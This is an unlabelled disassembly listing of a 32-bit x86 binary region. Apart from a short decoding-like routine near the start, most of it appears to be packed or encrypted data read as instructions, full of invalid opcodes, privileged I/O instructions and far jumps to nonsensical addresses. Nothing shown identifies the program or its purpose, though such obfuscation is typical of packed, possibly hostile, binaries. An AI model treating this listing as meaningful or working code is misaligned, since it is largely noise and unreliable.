  41e90b:	jb     0x41e8dc
  41e90d:	adc    bl,BYTE PTR [edx+0x22]
  41e910:	sbb    BYTE PTR [ebp-0x7533038a],bh
  41e916:	lods   eax,DWORD PTR ds:[esi]
  41e917:	pop    ecx
  41e918:	repnz sub BYTE PTR [edx+0x68],0x43
  41e91d:	mov    edi,0x3bbc70d2
  41e922:	adc    DWORD PTR [ecx],esp
  41e924:	mov    cl,0x2d
  41e926:	push   eax
  41e927:	sbb    BYTE PTR [eax],bh
  41e929:	sub    esi,0x5
  41e92c:	daa    
  41e92d:	xchg   ecx,eax
  41e92e:	les    eax,FWORD PTR [edi+0x63e9e1e9]
  41e934:	xchg   edx,eax
  41e935:	out    dx,al
  41e936:	test   eax,0x519189bf
  41e93b:	pop    ss
  41e93c:	jg     0x41e935
  41e93e:	mov    BYTE PTR [edx+0x2b],bh
  41e941:	and    BYTE PTR [ebx+ebp*8+0x212d32f2],0x98
  41e949:	jo     0x41e913
  41e94b:	into   
  41e94c:	xor    edx,eax
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs es (bad) 
  41e99b:	fs push ecx
  41e99d:	xor    DWORD PTR [esi+0xa7a7dc2],ecx
  41e9a3:	pop    edi
  41e9a4:	jp     0x41ea20
  41e9a6:	adc    DWORD PTR [ebx+ebx*4-0x59590844],edx
  41e9ad:	xor    eax,0x39f76dc0
  41e9b2:	lods   eax,DWORD PTR ds:[esi]
  41e9b3:	ins    BYTE PTR es:[edi],dx
  41e9b4:	mov    eax,ds:0x95a1e1db
  41e9b9:	push   esi
  41e9ba:	push   edx
  41e9bb:	icebp  
  41e9bc:	hlt    
  41e9bd:	sbb    edx,esi
  41e9bf:	xchg   di,ax
  41e9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9c3:	mov    bl,0x98
  41e9c5:	xchg   DWORD PTR [eax+ecx*4-0x5538efba],ecx
  41e9cc:	cmp    al,0xe8
  41e9ce:	cmp    al,0xfe
  41e9d0:	pop    ss
  41e9d1:	shl    BYTE PTR [eax-0x5a],cl
  41e9d4:	adc    al,0x7
  41e9d6:	mov    BYTE PTR [edi-0x3f],al
  41e9d9:	lods   eax,DWORD PTR ds:[esi]
  41e9da:	(bad)  
  41e9db:	and    BYTE PTR [esi+0x79868eda],dh
  41e9e1:	ret    
  41e9e2:	lods   eax,DWORD PTR ds:[esi]
  41e9e3:	inc    ecx
  41e9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9e5:	fbstp  TBYTE PTR [edi-0x3b]
  41e9e8:	sbb    BYTE PTR [ebx-0xe4b65aa],0x64
  41e9ef:	loop   0x41e9b0
  41e9f1:	jmp    FWORD PTR [edx+0x76]
  41e9f4:	ror    BYTE PTR [esi],cl
  41e9f6:	or     ebx,DWORD PTR [ebx+eiz*2]
  41e9f9:	bound  ebp,QWORD PTR [ecx]
  41e9fb:	jecxz  0x41ea6a
  41e9fd:	and    DWORD PTR ds:[esi-0x2981af2e],esp
  41ea04:	pushf  
  41ea05:	sub    DWORD PTR [eax+0x545e3da9],esi
  41ea0b:	mov    ecx,0x40b7fb9e
  41ea10:	push   ebx
  41ea11:	jae    0x41e9b6
  41ea13:	daa    
  41ea14:	int    0x2b
  41ea16:	cmp    esp,ebx
  41ea18:	out    0xf2,al
  41ea1a:	mov    dl,0x3a
  41ea1c:	xchg   BYTE PTR [ebx+0x5],al
  41ea1f:	shr    dl,0x71
  41ea22:	pop    esp
  41ea23:	mov    bl,0x84
  41ea25:	in     al,0xec
  41ea27:	lods   eax,DWORD PTR ds:[esi]
  41ea28:	jmp    0x3c92377c
  41ea2d:	imul   ecx,DWORD PTR [ebp-0x35],0x5a
  41ea31:	(bad)  
  41ea33:	jl     0x41e9d9
  41ea35:	adc    BYTE PTR [esi+esi*1+0x63],bh
  41ea39:	xchg   esi,eax
  41ea3a:	mov    ch,0xbb
  41ea3c:	scas   eax,DWORD PTR es:[edi]
  41ea3d:	lock (bad) 
  41ea3f:	pop    edi
  41ea40:	and    DWORD PTR [edx],ebx
  41ea42:	das    
  41ea43:	adc    bh,BYTE PTR [ebx+0x8]
  41ea46:	aas    
  41ea47:	ror    DWORD PTR [eax-0x6c],cl
  41ea4a:	fs jg  0x41ea2a
  41ea4d:	ins    BYTE PTR es:[edi],dx
  41ea4e:	push   ebx
  41ea4f:	pop    ebx
  41ea50:	(bad)  
  41ea51:	jo     0x41ea1e
  41ea53:	add    ah,BYTE PTR [ebx+0x55]
  41ea56:	dec    ecx
  41ea57:	pop    edx
  41ea58:	or     al,0x31
  41ea5a:	xchg   ebx,eax
  41ea5b:	adc    esp,DWORD PTR ds:0xfb542a2
  41ea61:	imul   esp,esp,0x77b06e28
  41ea67:	(bad)  
  41ea68:	mov    eax,ds:0xc7877a27
  41ea6d:	push   ebp
  41ea6e:	or     al,0x1f
  41ea70:	sub    bh,BYTE PTR [ecx+0x13]
  41ea73:	cmp    ebx,DWORD PTR [eax-0x63]
  41ea76:	xor    eax,0xf0a01725
  41ea7b:	out    dx,al
  41ea7c:	pop    ss
  41ea7d:	(bad)  
  41ea7f:	push   ebx
  41ea80:	jno    0x41eaee
  41ea82:	std    
  41ea83:	cmp    dl,dl
  41ea85:	gs add eax,0x4be6e7f9
  41ea8b:	jo     0x41ea39
  41ea8d:	scas   al,BYTE PTR es:[edi]
  41ea8e:	in     eax,0x91
  41ea90:	fadd   st(0),st
  41ea92:	add    edi,DWORD PTR [esi+ebp*8]
  41ea95:	test   DWORD PTR [eax-0x493b2edf],eax
  41ea9b:	pop    ss
  41ea9c:	je     0x41ea20
  41ea9e:	lock icebp 
  41eaa0:	lods   al,BYTE PTR ds:[esi]
  41eaa1:	mov    es,WORD PTR [ebp+0x3b]
  41eaa4:	enter  0x6ebb,0x3c
  41eaa8:	dec    edx
  41eaa9:	dec    edx
  41eaaa:	mov    dh,0x98
  41eaac:	dec    esi
  41eaad:	and    eax,0xc79ee3a5
  41eab2:	imul   esp,DWORD PTR [esi+0x27028233],0xffffffd3
  41eab9:	int3   
  41eaba:	addr16 test eax,0x640df1a4
  41eac0:	ins    DWORD PTR es:[edi],dx
  41eac1:	in     al,0xe3
  41eac3:	sub    eax,0xa8ca50aa
  41eac8:	add    al,0x59
  41eaca:	xchg   edi,eax
  41eacb:	pop    eax
  41eacc:	mov    bl,0xc4
  41eace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eacf:	xor    al,0x16
  41ead1:	sbb    ebx,DWORD PTR [esi*2-0x2e6bded1]
  41ead8:	es out dx,al
  41eada:	daa    
  41eadb:	inc    ecx
  41eadc:	pop    eax
  41eadd:	inc    ebp
  41eade:	clc    
  41eadf:	jecxz  0x41eb21
  41eae1:	and    eax,0x33e5b30f
  41eae6:	jecxz  0x41eb60
  41eae8:	add    edx,DWORD PTR [esi]
  41eaea:	pushf  
  41eaeb:	or     al,0xae
  41eaed:	sbb    esi,DWORD PTR [ecx+0x7c822120]
  41eaf3:	hlt    
  41eaf4:	cmp    BYTE PTR [esi+0x1793564f],dl
  41eafa:	mov    eax,ds:0xbc64b7f2
  41eaff:	sub    eax,0xd81cb215
  41eb04:	add    DWORD PTR [edx+0x432febfc],edi
  41eb0a:	test   al,0xe0
  41eb0c:	inc    esi
  41eb0d:	loope  0x41eaeb
  41eb0f:	xor    al,0xfb
  41eb11:	shr    DWORD PTR [edx-0x4d38d1c6],0xbb
  41eb18:	test   cl,al
  41eb1a:	jbe    0x41eb77
  41eb1c:	inc    DWORD PTR [edi]
  41eb1e:	dec    eax
  41eb1f:	test   al,0xaf
  41eb21:	shl    BYTE PTR [esi-0x27956e3d],1
  41eb27:	fisubr WORD PTR [ebp+0x5d]
  41eb2a:	sahf   
  41eb2b:	bound  edx,QWORD PTR [ecx]
  41eb2d:	add    edx,DWORD PTR [edi]
  41eb2f:	and    esp,eax
  41eb31:	scas   al,BYTE PTR es:[edi]
  41eb32:	bound  esi,QWORD PTR [esi]
  41eb34:	xchg   esp,eax
  41eb35:	test   al,0x57
  41eb37:	or     BYTE PTR [esi],al
  41eb39:	hlt    
  41eb3a:	cs dec ebp
  41eb3c:	ret    
  41eb3d:	and    bl,BYTE PTR [ebp+ecx*8+0x140b2411]
  41eb44:	aas    
  41eb45:	xchg   ebp,eax
  41eb46:	ror    BYTE PTR [esi+ebx*4+0x33],1
  41eb4a:	xor    al,BYTE PTR [ecx+edx*8+0x9e25a1c]
  41eb51:	lock js 0x41eafe
  41eb54:	jno    0x41eb5b
  41eb56:	adc    al,0xfa
  41eb58:	mov    edx,0x50c395ca
  41eb5d:	xor    eax,0xb7497447
  41eb62:	ficom  DWORD PTR [ebx+0x69e86e3b]
  41eb68:	push   eax
  41eb69:	rol    DWORD PTR [ebp+0x4267a013],1
  41eb6f:	jge    0x41eb82
  41eb71:	inc    edi
  41eb72:	mul    BYTE PTR [ebx]
  41eb74:	xor    eax,0xfae3b126
  41eb79:	loop   0x41eb4b
  41eb7b:	mov    edx,0xac6c74cc
  41eb80:	mov    WORD PTR [ebx],fs
  41eb82:	inc    edi
  41eb83:	stos   DWORD PTR es:[edi],eax
  41eb84:	mov    dh,0x52
  41eb86:	cmp    ch,BYTE PTR [ebp-0x2d64877]
  41eb8c:	sub    cl,bl
  41eb8e:	inc    esp
  41eb8f:	in     eax,0x65
  41eb91:	and    al,0xea
  41eb93:	jb     0x41eb49
  41eb95:	push   0xadef7bbb
  41eb9a:	add    eax,0x5c6e6fde
  41eb9f:	add    eax,0x24e9ebc0
  41eba4:	xchg   edi,eax
  41eba5:	ror    DWORD PTR [edx],cl
  41eba7:	inc    esi
  41eba8:	jmp    0x2fd:0x8234d106
  41ebaf:	out    dx,al
  41ebb0:	inc    edx
  41ebb1:	mov    ch,0x9b
  41ebb3:	scas   eax,DWORD PTR es:[edi]
  41ebb4:	imul   ebx,DWORD PTR ss:[ebp-0x47],0x7b
  41ebb9:	cmp    ecx,DWORD PTR [eax]
  41ebbb:	les    ecx,FWORD PTR [esi]
  41ebbd:	mov    WORD PTR [edi+0x1f8897e],cs
  41ebc3:	or     BYTE PTR [esi+eax*4+0x2b],ah
  41ebc7:	pop    ebx
  41ebc8:	jns    0x41ec39
  41ebca:	xchg   ebx,eax
  41ebcb:	neg    DWORD PTR [esi-0xb]
  41ebce:	adc    bl,ah
  41ebd0:	dec    DWORD PTR [eax+0x2c]
  41ebd3:	sub    ebp,eax
  41ebd5:	cmp    DWORD PTR [esp+esi*8+0x49],eax
  41ebd9:	and    al,0x75
  41ebdb:	daa    
  41ebdc:	(bad)  
  41ebdd:	stc    
  41ebde:	mov    ah,0x29
  41ebe0:	pop    ecx
  41ebe1:	cmp    DWORD PTR [eax-0x4903ddc0],edx
  41ebe7:	dec    ebp
  41ebe8:	xchg   edx,eax
  41ebe9:	(bad)  
  41ebea:	mov    gs,edi
  41ebec:	push   ds
  41ebed:	aad    0xdd
  41ebef:	add    ch,dh
  41ebf1:	xor    ah,BYTE PTR [edx]
  41ebf3:	pop    edx
  41ebf4:	sbb    al,0xda
  41ebf6:	ins    BYTE PTR es:[edi],dx
  41ebf7:	arpl   WORD PTR [eax+0x556a5be2],di
  41ebfd:	cmc    
  41ebfe:	test   BYTE PTR [eax-0x222ce90d],bh
  41ec04:	out    dx,eax
  41ec05:	js     0x41eb97
  41ec07:	and    dl,al
  41ec09:	xchg   esi,eax
  41ec0a:	mov    ebx,0xa0474e18
  41ec0f:	dec    eax
  41ec10:	pusha  
  41ec11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec12:	retf   
  41ec13:	imul   edx,DWORD PTR [edx+eiz*4+0x55],0x16
  41ec18:	jmp    0x27b2a97c
  41ec1d:	mov    cl,ah
  41ec1f:	sub    edi,edi
  41ec21:	mov    ds:0xe8ad1064,al
  41ec26:	xor    bl,BYTE PTR [ebp-0x46b79879]
  41ec2c:	add    al,0x34
  41ec2e:	jg     0x41ebce
  41ec30:	out    0x3c,al
  41ec32:	xchg   edx,eax
  41ec33:	adc    BYTE PTR [edx],0x58
  41ec36:	out    0xf5,eax
  41ec38:	xchg   esp,eax
  41ec39:	push   0xffffffad
  41ec3b:	cwde   
  41ec3c:	sbb    dh,BYTE PTR [ecx]
  41ec3e:	inc    ebp
  41ec3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec40:	fidivr WORD PTR [esi+0x71239c5a]
  41ec46:	fsubr  QWORD PTR [eax-0x37]
  41ec49:	arpl   WORD PTR [eax+0x89a9459],cx
  41ec4f:	call   0x4759:0x8c470edc
  41ec56:	sbb    al,0xf4
  41ec58:	retf   0x51d6
  41ec5b:	add    al,BYTE PTR [ecx]
  41ec5d:	mov    ebp,0xac250f01
  41ec62:	fsubr  DWORD PTR [ecx+ecx*8]
  41ec65:	pop    ecx
  41ec66:	mov    esp,gs
  41ec68:	dec    esi
  41ec69:	imul   eax,DWORD PTR [edx+0x401473c0],0x73d63a4a
  41ec73:	les    ecx,FWORD PTR [edi+ebp*4+0x11]
  41ec77:	frstor [esi+0xc3f80a9]
  41ec7d:	fisubr DWORD PTR [esi-0x12]
  41ec80:	jmp    0x4498:0x7d41b81f
  41ec87:	int3   
  41ec88:	imul   esp,DWORD PTR ds:0x327c27de,0xffffffd8
  41ec8f:	push   0x7e640a7a
  41ec94:	out    dx,al
  41ec95:	fistp  WORD PTR [ebx+0x59]
  41ec98:	and    BYTE PTR [edi-0x5c],ch
  41ec9b:	mov    al,ds:0x31bd99a4
  41eca0:	mov    esp,DWORD PTR [ebp-0x7b]
  41eca3:	loope  0x41ec63
  41eca5:	call   0xa2c3:0x70c1dd16
  41ecac:	push   ecx
  41ecad:	int    0xe9
  41ecaf:	das    
  41ecb0:	add    DWORD PTR [ebp+0x78],ebx
  41ecb3:	jno    0x41ec84
  41ecb5:	aaa    
  41ecb6:	pop    ebp
  41ecb7:	and    ecx,DWORD PTR [ecx+ecx*1]
  41ecba:	and    DWORD PTR gs:[ebx],ecx
  41ecbd:	or     BYTE PTR ds:[ecx-0x12],0x67
  41ecc2:	loope  0x41ecc4
  41ecc4:	push   0xf473a7b
  41ecc9:	inc    eax
  41ecca:	jp     0x41ecc8
  41eccc:	inc    ebx
  41eccd:	lahf   
  41ecce:	dec    edi
  41eccf:	mov    al,ch
  41ecd1:	dec    ebp
  41ecd2:	cmp    al,0x90
  41ecd4:	mov    edi,DWORD PTR [ebx-0x328e735b]
  41ecda:	lods   eax,DWORD PTR ds:[esi]
  41ecdb:	add    esp,esp
  41ecdd:	mov    ebx,0x998749ff
  41ece2:	dec    ecx
  41ece3:	inc    eax
  41ece4:	sbb    BYTE PTR ds:0x2060221d,0xdd
  41eceb:	fbstp  TBYTE PTR [eax-0x3d]
  41ecee:	fld    TBYTE PTR [eax-0x36]
  41ecf1:	and    al,BYTE PTR [ebx-0xa257b91]
  41ecf7:	cmp    esp,0xfad2143e
  41ecfd:	addr16 inc edi
  41ecff:	scas   eax,DWORD PTR es:[edi]
  41ed00:	mov    ch,0xa8
  41ed02:	dec    ebp
  41ed03:	sbb    eax,0xf8d19f84
  41ed08:	sbb    al,0x2a
  41ed0a:	popf   
  41ed0b:	data16 cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41ed0e:	stos   DWORD PTR es:[edi],eax
  41ed0f:	std    
  41ed10:	add    cl,BYTE PTR [eax]
  41ed12:	lds    esi,FWORD PTR [ecx-0x5e287374]
  41ed18:	sbb    dh,BYTE PTR es:[ebx+0x50d38abb]
  41ed1f:	sub    DWORD PTR [edx],ebp
  41ed21:	fdivr  DWORD PTR [eax+0x385614fc]
  41ed27:	push   cs
  41ed28:	inc    edi
  41ed29:	push   0xfffffff3
  41ed2b:	mov    esp,DWORD PTR [edi*1+0x150b0c6b]
  41ed32:	xchg   ebp,eax
  41ed33:	lea    ebx,[edx]
  41ed35:	ror    DWORD PTR [edx-0x601aee8a],1
  41ed3b:	(bad)  
  41ed3c:	fisubr WORD PTR [esi]
  41ed3e:	pop    ds
  41ed3f:	test   DWORD PTR [eax+edi*8+0x3eed2d00],eax
  41ed46:	push   eax
  41ed47:	pop    eax
  41ed48:	cli    
  41ed49:	idiv   bh
  41ed4b:	pop    ebp
  41ed4c:	cli    
  41ed4d:	(bad)  
  41ed4e:	int3   
  41ed4f:	(bad)  
  41ed50:	repnz pop ebp
  41ed52:	mov    esi,0x1b59da60
  41ed57:	retf   0xf110
  41ed5a:	daa    
  41ed5b:	xchg   ebp,eax
  41ed5c:	add    BYTE PTR [edi-0x12],dh
  41ed5f:	sbb    ax,0x932a
  41ed63:	jb     0x41ed81
  41ed65:	xor    DWORD PTR [edx-0x74],0x7946676b
  41ed6c:	stos   BYTE PTR es:[edi],al
  41ed6d:	inc    esi
  41ed6e:	pop    edi
  41ed6f:	out    dx,al
  41ed70:	cmp    BYTE PTR [ecx],dl
  41ed72:	push   edx
  41ed73:	push   cs
  41ed74:	mul    DWORD PTR [edx-0x6b]
  41ed77:	imul   ecx,DWORD PTR [edi-0x3c],0xffffffaf
  41ed7b:	sbb    BYTE PTR [esp+eax*2-0xb],dl
  41ed7f:	jmp    0x41ed9c
  41ed81:	xor    al,0x3
  41ed83:	push   ss
  41ed84:	jmp    0x1574:0x95849e4f
  41ed8b:	fwait
  41ed8c:	(bad)  
  41ed8d:	ret    
  41ed8e:	sbb    al,0x60
  41ed90:	jg     0x41ed89
  41ed92:	pop    eax
  41ed93:	or     bh,BYTE PTR [edi]
  41ed95:	and    edi,eax
  41ed97:	les    edx,FWORD PTR [edi-0x6ed20fd]
  41ed9d:	add    al,0x28
  41ed9f:	jbe    0x41edd5
  41eda1:	mul    DWORD PTR [ebx]
  41eda3:	push   eax
  41eda4:	repz or DWORD PTR [ebx],edi
  41eda7:	adc    edx,DWORD PTR [edx-0xc]
  41edaa:	sar    BYTE PTR ds:0xdb60345b,0xa4
  41edb1:	cmp    esi,ebp
  41edb3:	jecxz  0x41ed82
  41edb5:	sar    BYTE PTR [si],cl
  41edb8:	loopne 0x41edd2
  41edba:	fcmovnbe st,st(4)
  41edbc:	dec    edi
  41edbd:	inc    edx
  41edbe:	adc    al,0xe4
  41edc0:	nop
  41edc1:	xor    BYTE PTR [eax-0x4199884a],0xcf
  41edc8:	mov    bl,0x8b
  41edca:	shr    BYTE PTR ds:0x4a1e4892,0x82
  41edd1:	stos   DWORD PTR es:[edi],eax
  41edd2:	(bad)  
  41edd3:	nop
  41edd4:	cdq    
  41edd5:	pop    es
  41edd6:	aam    0x19
  41edd8:	push   eax
  41edd9:	in     al,0x3f
  41eddb:	pop    esp
  41eddc:	gs pop eax
  41edde:	and    bh,dh
  41ede0:	pop    ecx
  41ede1:	(bad)  
  41ede2:	jecxz  0x41ee2b
  41ede4:	jg     0x41ee30
  41ede6:	add    ebp,ecx
  41ede8:	nop
  41ede9:	push   ds
  41edea:	je     0x41edd7
  41edec:	pop    ecx
  41eded:	push   ecx
  41edee:	cld    
  41edef:	mov    dh,0x25
  41edf1:	icebp  
  41edf2:	mov    bl,0x0
  41edf4:	mov    bl,BYTE PTR [edi+0x66]
  41edf7:	popa   
  41edf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf9:	stc    
  41edfa:	mov    dh,BYTE PTR ds:0x60bfd83d
  41ee00:	xor    ch,BYTE PTR [ebp+0x22449b43]
  41ee06:	xchg   edx,eax
  41ee07:	js     0x41ee53
  41ee09:	xchg   ebx,eax
  41ee0a:	push   ebp
  41ee0b:	push   0xabdf1876
  41ee10:	mov    ebp,0x62c9c526
  41ee15:	lods   eax,DWORD PTR ds:[esi]
  41ee16:	add    DWORD PTR [edi-0x2b16be5d],eax
  41ee1c:	scas   eax,DWORD PTR es:[edi]
  41ee1d:	push   ebx
  41ee1e:	cmp    BYTE PTR [edx+ecx*2],al
  41ee21:	pusha  
  41ee22:	and    DWORD PTR es:[edi-0x1e],edi
  41ee26:	add    al,0x40
  41ee28:	ret    
  41ee29:	xchg   esi,eax
  41ee2a:	or     bh,cl
  41ee2c:	xchg   edi,eax
  41ee2d:	xor    BYTE PTR [edx+0x544abc96],ch
  41ee33:	mov    ch,0x35
  41ee35:	fcmove st,st(1)
  41ee37:	loop   0x41ee79
  41ee39:	sub    eax,0x8ea606bb
  41ee3e:	cdq    
  41ee3f:	test   DWORD PTR [ebp-0x41],eax
  41ee42:	ja     0x41ee5a
  41ee44:	cmp    ah,al
  41ee46:	xchg   esp,eax
  41ee47:	push   eax
  41ee48:	push   ds
  41ee49:	lahf   
  41ee4a:	mov    ds:0x2562ae86,eax
  41ee4f:	adc    DWORD PTR [ebx+0x278327aa],0x6721552c
  41ee59:	(bad)  
  41ee5a:	pop    ebx
  41ee5b:	lahf   
  41ee5c:	scas   al,BYTE PTR es:[edi]
  41ee5d:	popa   
  41ee5e:	mov    al,ds:0x3e6ee2c9
  41ee63:	cmp    al,0x8
  41ee65:	dec    edx
  41ee66:	or     bh,BYTE PTR [edx]
  41ee68:	das    
  41ee69:	sub    BYTE PTR [ebx],al
  41ee6b:	add    eax,0x8b0b0511
  41ee70:	or     al,0x1d
  41ee72:	inc    edx
  41ee73:	data16 and ah,BYTE PTR [esi]
  41ee76:	and    ah,BYTE PTR [ebx-0x16]
  41ee79:	jb     0x41ee34
  41ee7b:	and    esi,DWORD PTR [esi+0x18]
  41ee7e:	(bad)  
  41ee7f:	sub    al,0x83
  41ee81:	mov    ch,0xd8
  41ee83:	(bad)  
  41ee84:	mov    eax,0x80b6babb
  41ee89:	xchg   BYTE PTR [ebx+0x47],ah
  41ee8c:	imul   ebp,DWORD PTR [edx],0xffffffb9
  41ee8f:	ins    BYTE PTR es:[edi],dx
  41ee90:	xor    al,BYTE PTR [ecx-0x3d]
  41ee93:	cwde   
  41ee94:	push   cs
  41ee95:	or     BYTE PTR [eiz*4+0x67d8c996],ch
  41ee9c:	idiv   BYTE PTR [ebx+0x14]
  41ee9f:	(bad)  
  41eea1:	sub    eax,DWORD PTR [eax-0x4962eaa6]
  41eea7:	test   BYTE PTR [esp+esi*1+0x5429a173],al
  41eeae:	nop
  41eeaf:	(bad)  
  41eeb2:	hlt    
  41eeb3:	jecxz  0x41ef2b
  41eeb5:	jo     0x41ef2d
  41eeb7:	popa   
  41eeb8:	icebp  
  41eeb9:	mov    edx,0x2c6f44e3
  41eebe:	push   es
  41eebf:	dec    edx
  41eec0:	cmp    al,0x98
  41eec2:	xchg   ecx,eax
  41eec3:	lods   eax,DWORD PTR ds:[esi]
  41eec4:	(bad)  
  41eec5:	mov    edi,0xddc16a7f
  41eeca:	sub    DWORD PTR [eax+0x1778cb66],ebp
  41eed0:	mov    bh,0xf
  41eed2:	cli    
  41eed3:	dec    eax
  41eed4:	add    ah,dl
  41eed6:	mov    al,ds:0x10f2a4dc
  41eedb:	(bad)  
  41eedc:	push   ebx
  41eedd:	pop    ss
  41eede:	shr    bl,cl
  41eee0:	sbb    BYTE PTR [edx+0x365174e6],al
  41eee6:	dec    esp
  41eee7:	nop
  41eee8:	xchg   ecx,eax
  41eee9:	add    BYTE PTR [ecx+0x66608a93],0x1
  41eef0:	inc    esp
  41eef1:	daa    
  41eef2:	cs jp  0x41ef0c
  41eef5:	inc    eax
  41eef6:	sbb    ecx,DWORD PTR ds:0xea418095
  41eefc:	std    
  41eefd:	jmp    0x41ee8e
  41eeff:	pusha  
  41ef00:	stos   DWORD PTR es:[edi],eax
  41ef01:	repz pop esp
  41ef03:	js     0x41ee8d
  41ef05:	jbe    0x41eec7
  41ef07:	mov    dh,0xd1
  41ef09:	jmp    0x41eeac
  41ef0b:	call   0xa9f5:0x229cb6b2
  41ef12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef13:	arpl   WORD PTR [eax-0x35],si
  41ef16:	and    cl,BYTE PTR [edx+0x36]
  41ef19:	and    DWORD PTR es:[di],edx
  41ef1d:	ficom  DWORD PTR [edx+eax*4]
  41ef20:	clc    
  41ef21:	loopne 0x41eea5
  41ef23:	adc    DWORD PTR [eax+ecx*2],eax
  41ef26:	add    BYTE PTR [eax-0x27821370],dh
  41ef2c:	fdivp  st(7),st
  41ef2e:	repnz xlat BYTE PTR gs:[ebx]
  41ef31:	call   0xd2ecb5a9
  41ef36:	add    ah,al
  41ef38:	cdq    
  41ef39:	mov    cl,0x8b
  41ef3b:	imul   esp,DWORD PTR [esi],0x5830a3cb
  41ef41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef42:	call   0xb69c8e88
  41ef47:	sar    esi,1
  41ef49:	push   ebx
  41ef4a:	jns    0x41eef5
  41ef4c:	loopne 0x41ef7a
  41ef4e:	(bad)  
  41ef4f:	push   edx
  41ef50:	bts    DWORD PTR [ecx+eax*8+0x4c],ebp
  41ef55:	aaa    
  41ef56:	jno    0x41efa2
  41ef58:	mov    bl,BYTE PTR [ecx-0xa58392]
  41ef5e:	ja     0x41ef0b
  41ef60:	fnstsw WORD PTR [esi+eiz*8]
  41ef63:	mov    bh,0x9d
  41ef65:	cmp    cl,BYTE PTR [edx]
  41ef67:	cmp    eax,DWORD PTR ds:[ecx+0x7319aceb]
  41ef6e:	pop    ds
  41ef6f:	ja     0x41ef12
  41ef71:	cwde   
  41ef72:	imul   edx,DWORD PTR [edx-0x10],0x1d
  41ef76:	mov    eax,0xc2c8f955
  41ef7b:	out    0x89,al
  41ef7d:	xchg   ebp,edx
  41ef7f:	mov    ds:0xf76f2e56,al
  41ef84:	outs   dx,DWORD PTR ds:[esi]
  41ef85:	xor    al,BYTE PTR [ebp+edx*8-0x3e]
  41ef89:	ds cwde 
  41ef8b:	sbb    DWORD PTR [ecx],ebx
  41ef8d:	pop    edx
  41ef8e:	(bad)  
  41ef8f:	retf   0xccca
  41ef92:	repnz adc BYTE PTR [ecx-0x7489a775],ch
  41ef99:	xor    dh,BYTE PTR [ecx+0x33]
  41ef9c:	xor    BYTE PTR [edi-0x4f],dl
  41ef9f:	adc    al,0x9f
  41efa1:	popa   
  41efa2:	jmp    FWORD PTR [esi-0x1c8ba20c]
  41efa8:	mov    ecx,0xfd7ff263
  41efad:	ins    DWORD PTR es:[edi],dx
  41efae:	add    dl,BYTE PTR [ebx-0x43f6c0e5]
  41efb4:	out    0x46,eax
  41efb6:	inc    esp
  41efb7:	retf   
  41efb8:	cmp    al,0xc
  41efba:	push   cs
  41efbb:	call   0x5de3:0x1268bc52
  41efc2:	cmp    edx,edx
  41efc4:	retf   0x6027
  41efc7:	xor    DWORD PTR ds:0xa77c3cfb,esi
  41efcd:	outs   dx,DWORD PTR ds:[esi]
  41efce:	(bad)
  41efd1:	or     esp,DWORD PTR [ecx+edi*8+0x58]
  41efd5:	mov    dl,0x2a
  41efd7:	inc    edi
  41efd8:	add    dh,dl
  41efda:	push   eax
  41efdb:	jns    0x41f014
  41efdd:	sub    DWORD PTR [esi-0x36],esp
  41efe0:	push   ecx
  41efe1:	mov    cl,0x68
  41efe3:	xchg   ebp,eax
  41efe4:	mov    cs,esi
  41efe6:	add    BYTE PTR [eax+eax*8],al
  41efe9:	daa    
  41efea:	test   eax,0x86d45563
  41efef:	dec    ebx
  41eff0:	sbb    esi,esp
  41eff2:	ficom  DWORD PTR [ebx+0x70]
  41eff5:	popa   
  41eff6:	xchg   BYTE PTR [eax+0x4a],bl
  41eff9:	aaa    
  41effa:	je     0x41f028
  41effc:	in     eax,0x9
  41effe:	in     al,0xb3
  41f000:	lods   eax,DWORD PTR ds:[esi]
  41f001:	or     dh,BYTE PTR [esi+ebp*2]
  41f004:	xor    cl,BYTE PTR [esi+0x3b1c456b]
  41f00a:	xchg   edi,eax
  41f00b:	pop    ebp
  41f00c:	sbb    cl,BYTE PTR [esi]
  41f00e:	push   edi
  41f00f:	call   0x71547cf9
  41f014:	xor    al,0xb2
  41f016:	sbb    edx,DWORD PTR [esi-0x20]
  41f019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	shl    BYTE PTR [ebx+edx*8-0x15],0x2
  41f020:	xor    ch,BYTE PTR [ebx]
  41f022:	or     eax,0xdfbdba44
  41f027:	push   ecx
  41f028:	xor    bh,BYTE PTR [ebp-0x56166a7f]
  41f02e:	fmul   st(1),st
  41f030:	sub    DWORD PTR [esi],esp
  41f032:	push   eax
  41f033:	popf   
  41f034:	imul   ebx,eax,0x33
  41f037:	arpl   WORD PTR [eax],bx
  41f039:	mov    al,ds:0x83fca8f7
  41f03e:	inc    DWORD PTR [ebx-0x732110a7]
  41f044:	ins    BYTE PTR es:[edi],dx
  41f045:	cmp    eax,eax
  41f047:	jmp    DWORD PTR [edx+eax*8-0x7d2b6bed]
  41f04e:	lods   eax,DWORD PTR ds:[esi]
